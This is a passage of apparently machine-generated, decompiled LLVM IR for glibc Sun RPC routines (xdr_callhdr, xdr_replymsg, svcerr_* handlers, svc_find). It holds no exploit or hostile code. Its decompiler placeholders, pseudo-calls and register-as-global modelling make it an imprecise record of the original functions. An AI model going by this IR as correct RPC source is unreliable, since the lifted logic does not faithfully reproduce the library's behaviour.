  uselistorder i32 %v1_806311b, { 1, 0 }
  uselistorder i32 %tmp2, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp, { 8, 9, 10, 0, 1, 6, 5, 4, 3, 2, 7, 11 }
  uselistorder i32* %ecx.global-to-local, { 0, 3, 4, 1, 2, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 10, 8, 9, 11, 12, 13 }
  uselistorder label %dec_label_pc_80631e9, { 1, 0 }
  uselistorder label %dec_label_pc_80631b8, { 9, 6, 7, 8, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_80631a7, { 1, 0 }
}

define i32 @__GI_xdr_callhdr(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp1 = ptrtoint i32* %arg1 to i32
  %v0_80631ea = load i32, i32* @esi, align 4
  %v0_80631eb = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  store i32 %tmp1, i32* %esi.global-to-local, align 4
  %v1_80631f7 = add i32 %arg2, 4
  %v2_80631f7 = inttoptr i32 %v1_80631f7 to i32*
  store i32 0, i32* %v2_80631f7, align 4
  %v0_80631fe = load i32, i32* %ebx.global-to-local, align 4
  %v1_80631fe = add i32 %v0_80631fe, 8
  %v2_80631fe = inttoptr i32 %v1_80631fe to i32*
  store i32 2, i32* %v2_80631fe, align 4
  %v0_8063205 = load i32, i32* %esi.global-to-local, align 4
  %v1_8063205 = inttoptr i32 %v0_8063205 to i32*
  %v2_8063205 = load i32, i32* %v1_8063205, align 4
  %v3_8063205 = icmp eq i32 %v2_8063205, 0
  %v1_8063208 = icmp eq i1 %v3_8063205, false
  br i1 %v1_8063208, label %dec_label_pc_8063266, label %dec_label_pc_806320a

dec_label_pc_806320a:                             ; preds = %entry
  %v0_806320c = load i32, i32* %ebx.global-to-local, align 4
  %v3_806320e = call i32 @xdr_u_long(i32* %v1_8063205, i32 %v0_806320c)
  %v1_8063216 = icmp eq i32 %v3_806320e, 0
  br i1 %v1_8063216, label %dec_label_pc_8063266, label %dec_label_pc_806321a

dec_label_pc_806321a:                             ; preds = %dec_label_pc_806320a
  %v0_806321c = load i32, i32* @ebx, align 4
  %v1_806321c = add i32 %v0_806321c, 4
  %v0_8063220 = load i32, i32* %esi.global-to-local, align 4
  %v2_8063221 = call i32 @xdr_enum(i32 %v0_8063220, i32 %v1_806321c)
  %v1_8063229 = icmp eq i32 %v2_8063221, 0
  br i1 %v1_8063229, label %dec_label_pc_8063266, label %dec_label_pc_806322d

dec_label_pc_806322d:                             ; preds = %dec_label_pc_806321a
  %v0_806322f = load i32, i32* @ebx, align 4
  %v1_806322f = add i32 %v0_806322f, 8
  store i32 %v1_806322f, i32* @eax, align 4
  %v0_8063233 = load i32, i32* %esi.global-to-local, align 4
  %v2_8063234 = inttoptr i32 %v0_8063233 to i32*
  %v3_8063234 = call i32 @xdr_u_long(i32* %v2_8063234, i32 %v1_806322f)
  %v1_806323c = icmp eq i32 %v3_8063234, 0
  br i1 %v1_806323c, label %dec_label_pc_8063266, label %dec_label_pc_8063240

dec_label_pc_8063240:                             ; preds = %dec_label_pc_806322d
  %v0_8063242 = load i32, i32* @ebx, align 4
  %v1_8063242 = add i32 %v0_8063242, 12
  store i32 %v1_8063242, i32* @eax, align 4
  %v0_8063246 = load i32, i32* %esi.global-to-local, align 4
  %v2_8063247 = inttoptr i32 %v0_8063246 to i32*
  %v3_8063247 = call i32 @xdr_u_long(i32* %v2_8063247, i32 %v1_8063242)
  %v1_806324f = icmp eq i32 %v3_8063247, 0
  br i1 %v1_806324f, label %dec_label_pc_8063266, label %dec_label_pc_8063253

dec_label_pc_8063253:                             ; preds = %dec_label_pc_8063240
  %v0_8063253 = load i32, i32* @ebx, align 4
  %v1_8063253 = add i32 %v0_8063253, 16
  store i32 %v1_8063253, i32* @eax, align 4
  %v0_8063256 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_80631eb, i32* %ebx.global-to-local, align 4
  store i32 %v0_80631ea, i32* %esi.global-to-local, align 4
  %v2_8063261 = inttoptr i32 %v0_8063256 to i32*
  %v3_8063261 = call i32 @xdr_u_long(i32* %v2_8063261, i32 %v1_8063253)
  br label %dec_label_pc_8063266

dec_label_pc_8063266:                             ; preds = %dec_label_pc_8063240, %dec_label_pc_806322d, %dec_label_pc_806321a, %dec_label_pc_806320a, %entry, %dec_label_pc_8063253
  store i32 %v0_80631eb, i32* @ebx, align 4
  store i32 %v0_80631ea, i32* @esi, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_80631eb, { 1, 0 }
  uselistorder i32 %v0_80631ea, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8063266, { 5, 0, 1, 2, 3, 4 }
}

define i32 @__GI_xdr_rejected_reply(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg2 to i32
  %stack_var_-8 = alloca i32, align 4
  %v0_806326c = load i32, i32* @esi, align 4
  %v0_806326d = load i32, i32* @ebx, align 4
  store i32 %v0_806326d, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  %v2_806327b = call i32 @xdr_enum(i32 %arg1, i32 %tmp3)
  %v1_8063283 = icmp eq i32 %v2_806327b, 0
  br i1 %v1_8063283, label %dec_label_pc_80632cb, label %dec_label_pc_8063287

dec_label_pc_8063287:                             ; preds = %entry
  %v0_8063287 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8063287 = inttoptr i32 %v0_8063287 to i32*
  %v2_8063287 = load i32, i32* %v1_8063287, align 4
  %v1_8063289 = icmp eq i32 %v2_8063287, 0
  br i1 %v1_8063289, label %dec_label_pc_8063292, label %dec_label_pc_806328d

dec_label_pc_806328d:                             ; preds = %dec_label_pc_8063287
  %v8_806328d = icmp eq i32 %v2_8063287, 1
  %v1_806328e = icmp eq i1 %v8_806328d, false
  br i1 %v1_806328e, label %dec_label_pc_80632cb, label %dec_label_pc_806328d.dec_label_pc_80632b8_crit_edge

dec_label_pc_806328d.dec_label_pc_80632b8_crit_edge: ; preds = %dec_label_pc_806328d
  br label %dec_label_pc_80632b8

dec_label_pc_8063292:                             ; preds = %dec_label_pc_8063287
  %v1_8063294 = add i32 %v0_8063287, 4
  store i32 %v1_8063294, i32* @eax, align 4
  %v0_8063298 = load i32, i32* %esi.global-to-local, align 4
  %v2_8063299 = inttoptr i32 %v0_8063298 to i32*
  %v3_8063299 = call i32 @xdr_u_long(i32* %v2_8063299, i32 %v1_8063294)
  %v1_80632a1 = icmp eq i32 %v3_8063299, 0
  br i1 %v1_80632a1, label %dec_label_pc_80632cb, label %dec_label_pc_80632a5

dec_label_pc_80632a5:                             ; preds = %dec_label_pc_8063292
  %v0_80632a5 = load i32, i32* @ebx, align 4
  %v1_80632a5 = add i32 %v0_80632a5, 8
  store i32 %v1_80632a5, i32* @eax, align 4
  %v0_80632a8 = load i32, i32* %esi.global-to-local, align 4
  %v2_80632b1 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80632b1, i32* %ebx.global-to-local, align 4
  store i32 %v0_806326c, i32* %esi.global-to-local, align 4
  %v2_80632b3 = inttoptr i32 %v0_80632a8 to i32*
  %v3_80632b3 = call i32 @xdr_u_long(i32* %v2_80632b3, i32 %v1_80632a5)
  %v0_80632b8.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80632b8

dec_label_pc_80632b8:                             ; preds = %dec_label_pc_806328d.dec_label_pc_80632b8_crit_edge, %dec_label_pc_80632a5
  %v0_80632b8 = phi i32 [ %v0_8063287, %dec_label_pc_806328d.dec_label_pc_80632b8_crit_edge ], [ %v0_80632b8.pre, %dec_label_pc_80632a5 ]
  %v1_80632b8 = add i32 %v0_80632b8, 4
  %v0_80632bb = load i32, i32* %esi.global-to-local, align 4
  %v2_80632c4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80632c4, i32* %ebx.global-to-local, align 4
  store i32 %v0_806326c, i32* %esi.global-to-local, align 4
  %v2_80632c6 = call i32 @xdr_enum(i32 %v0_80632bb, i32 %v1_80632b8)
  br label %dec_label_pc_80632cb

dec_label_pc_80632cb:                             ; preds = %dec_label_pc_8063292, %dec_label_pc_806328d, %entry, %dec_label_pc_80632b8
  %v2_80632ce = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80632ce, i32* %ebx.global-to-local, align 4
  store i32 %v0_806326c, i32* %esi.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_806326c, { 2, 1, 0 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 3, 2, 4, 5, 6 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80632cb, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80632b8, { 1, 0 }
}

define i32 @__GI_xdr_replymsg() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v0_80632d1 = load i32, i32* @esi, align 4
  store i32 %tmp2, i32* @esi, align 4
  %v2_80632e0 = inttoptr i32 %tmp2 to i32*
  %v3_80632e0 = call i32 @xdr_u_long(i32* %v2_80632e0, i32 %tmp)
  %v1_80632e8 = icmp eq i32 %v3_80632e0, 0
  br i1 %v1_80632e8, label %dec_label_pc_8063322, label %dec_label_pc_80632ec

dec_label_pc_80632ec:                             ; preds = %entry
  %v0_80632ec = load i32, i32* @ebx, align 4
  %v1_80632ec = add i32 %v0_80632ec, 4
  %v0_80632f2 = load i32, i32* @esi, align 4
  %v2_80632f3 = call i32 @xdr_enum(i32 %v0_80632f2, i32 %v1_80632ec)
  %v1_80632fb = icmp eq i32 %v2_80632f3, 0
  br i1 %v1_80632fb, label %dec_label_pc_8063322, label %dec_label_pc_80632ff

dec_label_pc_80632ff:                             ; preds = %dec_label_pc_80632ec
  %v0_80632ff = load i32, i32* @ebx, align 4
  %v1_80632ff = add i32 %v0_80632ff, 4
  %v2_80632ff = inttoptr i32 %v1_80632ff to i32*
  %v3_80632ff = load i32, i32* %v2_80632ff, align 4
  %v12_80632ff = icmp eq i32 %v3_80632ff, 1
  %v1_8063303 = icmp eq i1 %v12_80632ff, false
  br i1 %v1_8063303, label %dec_label_pc_8063322, label %dec_label_pc_8063305

dec_label_pc_8063305:                             ; preds = %dec_label_pc_80632ff
  %v1_8063308 = add i32 %v0_80632ff, 12
  %v1_8063313 = add i32 %v0_80632ff, 8
  %v0_8063317 = load i32, i32* @esi, align 4
  %v5_8063318 = inttoptr i32 %v1_8063313 to i32*
  %v6_8063318 = call i32 @xdr_union(i32 %v0_8063317, i32* %v5_8063318, i32 %v1_8063308, i32 ptrtoint (i32* @global_var_806e640.862 to i32), i32 0)
  br label %dec_label_pc_8063324

dec_label_pc_8063322:                             ; preds = %dec_label_pc_80632ff, %dec_label_pc_80632ec, %entry
  br label %dec_label_pc_8063324

dec_label_pc_8063324:                             ; preds = %dec_label_pc_8063305, %dec_label_pc_8063322
  %v0_8063327 = phi i32 [ %v6_8063318, %dec_label_pc_8063305 ], [ 0, %dec_label_pc_8063322 ]
  store i32 %v0_80632d1, i32* @esi, align 4
  ret i32 %v0_8063327

; uselistorder directives
  uselistorder i32 %tmp2, { 1, 0 }
  uselistorder label %dec_label_pc_8063324, { 1, 0 }
}

define i32 @xdr_des_block(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8063335 = call i32 @xdr_opaque(i32 %arg1, i32 %arg2, i32 8)
  ret i32 %v3_8063335
}

define i32 @xdr_opaque_auth(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_806333e = load i32, i32* @esi, align 4
  %v0_806333f = load i32, i32* @ebx, align 4
  store i32 %v0_806333f, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v2_806334d = call i32 @xdr_enum(i32 %arg1, i32 %arg2)
  %v1_8063357 = icmp eq i32 %v2_806334d, 0
  br i1 %v1_8063357, label %dec_label_pc_8063373, label %dec_label_pc_806335b

dec_label_pc_806335b:                             ; preds = %entry
  %v0_806335b = load i32, i32* @ebx, align 4
  %v1_806335b = add i32 %v0_806335b, 8
  %v1_8063364 = add i32 %v0_806335b, 4
  %v0_8063368 = load i32, i32* @esi, align 4
  %v4_8063369 = inttoptr i32 %v0_8063368 to i32*
  %v5_8063369 = call i32 @xdr_bytes(i32* %v4_8063369, i32 %v1_8063364, i32 %v1_806335b, i32 400)
  br label %dec_label_pc_8063373

dec_label_pc_8063373:                             ; preds = %entry, %dec_label_pc_806335b
  %v0_8063373 = phi i32 [ 0, %entry ], [ %v5_8063369, %dec_label_pc_806335b ]
  %v2_8063376 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8063376, i32* @ebx, align 4
  store i32 %v0_806333e, i32* @esi, align 4
  ret i32 %v0_8063373

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8063373, { 1, 0 }
}

define i32 @__GI_xdr_accepted_reply(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8063379 = load i32, i32* @esi, align 4
  %v0_806337a = load i32, i32* @ebx, align 4
  store i32 %v0_806337a, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v2_8063388 = call i32 @xdr_opaque_auth(i32 %arg1, i32 %arg2)
  %v1_8063390 = icmp eq i32 %v2_8063388, 0
  br i1 %v1_8063390, label %dec_label_pc_80633f3, label %dec_label_pc_8063394

dec_label_pc_8063394:                             ; preds = %entry
  %v0_8063396 = load i32, i32* @ebx, align 4
  %v1_8063396 = add i32 %v0_8063396, 12
  %v0_806339a = load i32, i32* @esi, align 4
  %v2_806339b = call i32 @xdr_enum(i32 %v0_806339a, i32 %v1_8063396)
  %v1_80633a3 = icmp eq i32 %v2_806339b, 0
  br i1 %v1_80633a3, label %dec_label_pc_80633f3, label %dec_label_pc_80633a7

dec_label_pc_80633a7:                             ; preds = %dec_label_pc_8063394
  %v0_80633a7 = load i32, i32* @ebx, align 4
  %v1_80633a7 = add i32 %v0_80633a7, 12
  %v2_80633a7 = inttoptr i32 %v1_80633a7 to i32*
  %v3_80633a7 = load i32, i32* %v2_80633a7, align 4
  %v1_80633aa = icmp eq i32 %v3_80633a7, 0
  br i1 %v1_80633aa, label %dec_label_pc_80633ba, label %dec_label_pc_80633ae

dec_label_pc_80633ae:                             ; preds = %dec_label_pc_80633a7
  %v9_80633b3 = icmp eq i32 %v3_80633a7, 2
  %v1_80633b6 = icmp eq i1 %v9_80633b3, false
  br i1 %v1_80633b6, label %dec_label_pc_80633f5, label %dec_label_pc_80633cd

dec_label_pc_80633ba:                             ; preds = %dec_label_pc_80633a7
  %v1_80633c5 = add i32 %v0_80633a7, 20
  %v2_80633c5 = inttoptr i32 %v1_80633c5 to i32*
  %v3_80633c5 = load i32, i32* %v2_80633c5, align 4
  %v2_80633c9 = load i32, i32* %stack_var_-8, align 4
  store i32 %v0_8063379, i32* @esi, align 4
  call void @__pseudo_branch(i32 %v3_80633c5)
  br label %dec_label_pc_80633cd

dec_label_pc_80633cd:                             ; preds = %dec_label_pc_80633ae, %dec_label_pc_80633ba
  %v0_80633cf = phi i32 [ %v0_80633a7, %dec_label_pc_80633ae ], [ %v2_80633c9, %dec_label_pc_80633ba ]
  %v1_80633cf = add i32 %v0_80633cf, 16
  store i32 %v1_80633cf, i32* @eax, align 4
  %v0_80633d3 = load i32, i32* @esi, align 4
  %v2_80633d4 = inttoptr i32 %v0_80633d3 to i32*
  %v3_80633d4 = call i32 @xdr_u_long(i32* %v2_80633d4, i32 %v1_80633cf)
  %v1_80633dc = icmp eq i32 %v3_80633d4, 0
  br i1 %v1_80633dc, label %dec_label_pc_80633f3, label %dec_label_pc_80633e0

dec_label_pc_80633e0:                             ; preds = %dec_label_pc_80633cd
  %v0_80633e0 = load i32, i32* @ebx, align 4
  %v1_80633e0 = add i32 %v0_80633e0, 20
  %v0_80633e3 = load i32, i32* @esi, align 4
  %v2_80633eb = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80633eb, i32* @eax, align 4
  %v2_80633ee = inttoptr i32 %v0_80633e3 to i32*
  %v3_80633ee = call i32 @xdr_u_long(i32* %v2_80633ee, i32 %v1_80633e0)
  br label %dec_label_pc_80633f3

dec_label_pc_80633f3:                             ; preds = %dec_label_pc_80633cd, %dec_label_pc_8063394, %entry, %dec_label_pc_80633e0
  br label %dec_label_pc_80633f5

dec_label_pc_80633f5:                             ; preds = %dec_label_pc_80633ae, %dec_label_pc_80633f3
  %v0_80633f8 = phi i32 [ 1, %dec_label_pc_80633ae ], [ 0, %dec_label_pc_80633f3 ]
  ret i32 %v0_80633f8

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80633f5, { 1, 0 }
  uselistorder label %dec_label_pc_80633f3, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80633cd, { 1, 0 }
}

define i32 @svc_sendreply(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_8063418 = add i32 %arg1, 32
  %v3_8063420 = bitcast i32* %stack_var_-40 to i16*
  %v4_8063420 = call i32 @memcpy(i16* %v3_8063420, i32 %v1_8063418, i32 12)
  %v1_806343f = add i32 %arg1, 8
  %v2_806343f = inttoptr i32 %v1_806343f to i32*
  %v3_806343f = load i32, i32* %v2_806343f, align 4
  %v2_8063442 = ptrtoint i32* %stack_var_-52 to i32
  %v5_8063448 = add i32 %v3_806343f, 12
  %v6_8063448 = inttoptr i32 %v5_8063448 to i32*
  %v7_8063448 = load i32, i32* %v6_8063448, align 4
  call void @__pseudo_call(i32 %v7_8063448)
  ret i32 %v2_8063442
}

define i32 @svcerr_noproc(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_806346c = add i32 %arg1, 32
  %v3_8063474 = bitcast i32* %stack_var_-40 to i16*
  %v4_8063474 = call i32 @memcpy(i16* %v3_8063474, i32 %v1_806346c, i32 12)
  %v1_8063483 = add i32 %arg1, 8
  %v2_8063483 = inttoptr i32 %v1_8063483 to i32*
  %v3_8063483 = load i32, i32* %v2_8063483, align 4
  %v2_8063486 = ptrtoint i32* %stack_var_-52 to i32
  %v5_806348c = add i32 %v3_8063483, 12
  %v6_806348c = inttoptr i32 %v5_806348c to i32*
  %v7_806348c = load i32, i32* %v6_806348c, align 4
  call void @__pseudo_call(i32 %v7_806348c)
  ret i32 %v2_8063486
}

define i32 @svcerr_decode(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_80634b0 = add i32 %arg1, 32
  %v3_80634b8 = bitcast i32* %stack_var_-40 to i16*
  %v4_80634b8 = call i32 @memcpy(i16* %v3_80634b8, i32 %v1_80634b0, i32 12)
  %v1_80634c7 = add i32 %arg1, 8
  %v2_80634c7 = inttoptr i32 %v1_80634c7 to i32*
  %v3_80634c7 = load i32, i32* %v2_80634c7, align 4
  %v2_80634ca = ptrtoint i32* %stack_var_-52 to i32
  %v5_80634d0 = add i32 %v3_80634c7, 12
  %v6_80634d0 = inttoptr i32 %v5_80634d0 to i32*
  %v7_80634d0 = load i32, i32* %v6_80634d0, align 4
  call void @__pseudo_call(i32 %v7_80634d0)
  ret i32 %v2_80634ca
}

define i32 @svcerr_systemerr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_80634f4 = add i32 %arg1, 32
  %v3_80634fc = bitcast i32* %stack_var_-40 to i16*
  %v4_80634fc = call i32 @memcpy(i16* %v3_80634fc, i32 %v1_80634f4, i32 12)
  %v1_806350b = add i32 %arg1, 8
  %v2_806350b = inttoptr i32 %v1_806350b to i32*
  %v3_806350b = load i32, i32* %v2_806350b, align 4
  %v2_806350e = ptrtoint i32* %stack_var_-52 to i32
  %v5_8063514 = add i32 %v3_806350b, 12
  %v6_8063514 = inttoptr i32 %v5_8063514 to i32*
  %v7_8063514 = load i32, i32* %v6_8063514, align 4
  call void @__pseudo_call(i32 %v7_8063514)
  ret i32 %v2_806350e
}

define i32 @svcerr_auth(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_8063543 = add i32 %arg1, 8
  %v2_8063543 = inttoptr i32 %v1_8063543 to i32*
  %v3_8063543 = load i32, i32* %v2_8063543, align 4
  store i32 %v3_8063543, i32* @edx, align 4
  %v2_8063546 = ptrtoint i32* %stack_var_-48 to i32
  %v5_806354c = add i32 %v3_8063543, 12
  %v6_806354c = inttoptr i32 %v5_806354c to i32*
  %v7_806354c = load i32, i32* %v6_806354c, align 4
  call void @__pseudo_call(i32 %v7_806354c)
  ret i32 %v2_8063546

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @svcerr_weakauth(i32 %arg1) local_unnamed_addr {
entry:
  %v2_806355c = call i32 @svcerr_auth(i32 %arg1, i32 5)
  ret i32 %v2_806355c
}

define i32 @__GI_svcerr_noprog() local_unnamed_addr {
entry:
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_8063581 = add i32 %tmp3, 32
  %v3_8063589 = bitcast i32* %stack_var_-40 to i16*
  %v4_8063589 = call i32 @memcpy(i16* %v3_8063589, i32 %v1_8063581, i32 12)
  %v1_8063598 = add i32 %tmp3, 8
  %v2_8063598 = inttoptr i32 %v1_8063598 to i32*
  %v3_8063598 = load i32, i32* %v2_8063598, align 4
  store i32 %v3_8063598, i32* @edx, align 4
  %v2_806359b = ptrtoint i32* %stack_var_-52 to i32
  %v5_80635a1 = add i32 %v3_8063598, 12
  %v6_80635a1 = inttoptr i32 %v5_80635a1 to i32*
  %v7_80635a1 = load i32, i32* %v6_80635a1, align 4
  call void @__pseudo_call(i32 %v7_80635a1)
  ret i32 %v2_806359b
}

define i32 @svcerr_progvers() local_unnamed_addr {
entry:
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_80635c5 = add i32 %tmp7, 32
  %v3_80635cd = bitcast i32* %stack_var_-40 to i16*
  %v4_80635cd = call i32 @memcpy(i16* %v3_80635cd, i32 %v1_80635c5, i32 12)
  %v1_80635ec = add i32 %tmp7, 8
  %v2_80635ec = inttoptr i32 %v1_80635ec to i32*
  %v3_80635ec = load i32, i32* %v2_80635ec, align 4
  store i32 %v3_80635ec, i32* @edx, align 4
  %v2_80635ef = ptrtoint i32* %stack_var_-52 to i32
  %v5_80635f5 = add i32 %v3_80635ec, 12
  %v6_80635f5 = inttoptr i32 %v5_80635f5 to i32*
  %v7_80635f5 = load i32, i32* %v6_80635f5, align 4
  call void @__pseudo_call(i32 %v7_80635f5)
  ret i32 %v2_80635ef
}

define i32 @svc_find(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80635fd = load i32, i32* @edi, align 4
  %v0_80635fe = load i32, i32* @eax, align 4
  store i32 %v0_80635fe, i32* @edi, align 4
  %v0_8063600 = load i32, i32* @esi, align 4
  %v0_8063601 = load i32, i32* @ecx, align 4
  store i32 %v0_8063601, i32* @esi, align 4
  %v0_8063603 = load i32, i32* @ebx, align 4
  store i32 %v0_8063603, i32* %stack_var_-12, align 4
  %v0_8063604 = load i32, i32* @edx, align 4
  store i32 %v0_8063604, i32* @ebx, align 4
  %v1_8063606 = call i32 @__rpc_thread_variables(i32 %v0_8063603)
  store i32 %v1_8063606, i32* %eax.global-to-local, align 4
  %v1_806360d = add i32 %v1_8063606, 184
  %storemerge.in1 = inttoptr i32 %v1_806360d to i32*
  %storemerge2 = load i32, i32* %storemerge.in1, align 4
  store i32 %storemerge2, i32* %eax.global-to-local, align 4
  %v1_80636233 = icmp eq i32 %storemerge2, 0
  %v1_806362510 = icmp eq i1 %v1_80636233, false
  br i1 %v1_806362510, label %dec_label_pc_8063615.lr.ph, label %dec_label_pc_8063627

dec_label_pc_8063615.lr.ph:                       ; preds = %entry
  %v4_8063615.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8063615

dec_label_pc_8063615:                             ; preds = %dec_label_pc_8063615.lr.ph, %dec_label_pc_806361f
  %v0_806362714 = phi i32 [ 0, %dec_label_pc_8063615.lr.ph ], [ %v0_806361f, %dec_label_pc_806361f ]
  %v0_806361f = phi i32 [ %storemerge2, %dec_label_pc_8063615.lr.ph ], [ %storemerge, %dec_label_pc_806361f ]
  %v1_8063615 = add i32 %v0_806361f, 4
  %v2_8063615 = inttoptr i32 %v1_8063615 to i32*
  %v3_8063615 = load i32, i32* %v2_8063615, align 4
  %v15_8063615 = icmp eq i32 %v3_8063615, %v4_8063615.pre
  %v1_8063618 = icmp eq i1 %v15_8063615, false
  br i1 %v1_8063618, label %dec_label_pc_806361f, label %dec_label_pc_806361a

dec_label_pc_806361a:                             ; preds = %dec_label_pc_8063615
  %v1_806361a = add i32 %v0_806361f, 8
  %v2_806361a = inttoptr i32 %v1_806361a to i32*
  %v3_806361a = load i32, i32* %v2_806361a, align 4
  %v4_806361a = load i32, i32* @ebx, align 4
  %v15_806361a = icmp eq i32 %v3_806361a, %v4_806361a
  br i1 %v15_806361a, label %dec_label_pc_806361a.dec_label_pc_8063627_crit_edge, label %dec_label_pc_806361f

dec_label_pc_806361f:                             ; preds = %dec_label_pc_806361a, %dec_label_pc_8063615
  %storemerge.in = inttoptr i32 %v0_806361f to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8063623 = icmp eq i32 %storemerge, 0
  %v1_8063625 = icmp eq i1 %v1_8063623, false
  br i1 %v1_8063625, label %dec_label_pc_8063615, label %dec_label_pc_8063623.dec_label_pc_8063627_crit_edge

dec_label_pc_806361a.dec_label_pc_8063627_crit_edge: ; preds = %dec_label_pc_806361a
  br label %dec_label_pc_8063627

dec_label_pc_8063623.dec_label_pc_8063627_crit_edge: ; preds = %dec_label_pc_806361f
  br label %dec_label_pc_8063627

dec_label_pc_8063627:                             ; preds = %dec_label_pc_8063623.dec_label_pc_8063627_crit_edge, %dec_label_pc_806361a.dec_label_pc_8063627_crit_edge, %entry
  %v0_8063627 = phi i32 [ %v0_806361f, %dec_label_pc_8063623.dec_label_pc_8063627_crit_edge ], [ %v0_806362714, %dec_label_pc_806361a.dec_label_pc_8063627_crit_edge ], [ 0, %entry ]
  %v1_8063627 = load i32, i32* @esi, align 4
  %v2_8063627 = inttoptr i32 %v1_8063627 to i32*
  store i32 %v0_8063627, i32* %v2_8063627, align 4
  %v2_8063629 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8063629, i32* @ebx, align 4
  store i32 %v0_8063600, i32* @esi, align 4
  store i32 %v0_80635fd, i32* @edi, align 4
  %v0_806362c = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_806362c

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_806361f, { 0, 2, 3, 4, 1 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8063615, { 1, 0 }
}

define i32 @svc_getreq_common(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-896 = alloca i32, align 4
  %stack_var_-1296 = alloca i32, align 4
  %v4_806363b = ptrtoint i32* %stack_var_-1296 to i32
  %v2_8063642 = ptrtoint i32* %stack_var_-896 to i32
  store i32 %v2_8063642, i32* %eax.global-to-local, align 4
  %v1_8063650 = call i32 @__rpc_thread_variables(i32 %v4_806363b)
  store i32 %v1_8063650, i32* %eax.global-to-local, align 4
  store i32 %v1_8063650, i32* %ebp.global-to-local, align 4
  %v1_8063657 = add i32 %v1_8063650, 180
  %v2_8063657 = inttoptr i32 %v1_8063657 to i32*
  %v3_8063657 = load i32, i32* %v2_8063657, align 4
  store i32 %v3_8063657, i32* @edx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v2_8063664 = mul i32 %arg1, 4
  %v3_8063664 = add i32 %v3_8063657, %v2_8063664
  %v4_8063664 = inttoptr i32 %v3_8063664 to i32*
  %v5_8063664 = load i32, i32* %v4_8063664, align 4
  store i32 %v5_8063664, i32* @ebx, align 4
  %v1_8063667 = icmp eq i32 %v5_8063664, 0
  br i1 %v1_8063667, label %entry.dec_label_pc_80637bf_crit_edge, label %dec_label_pc_806366f.preheader

entry.dec_label_pc_80637bf_crit_edge:             ; preds = %entry
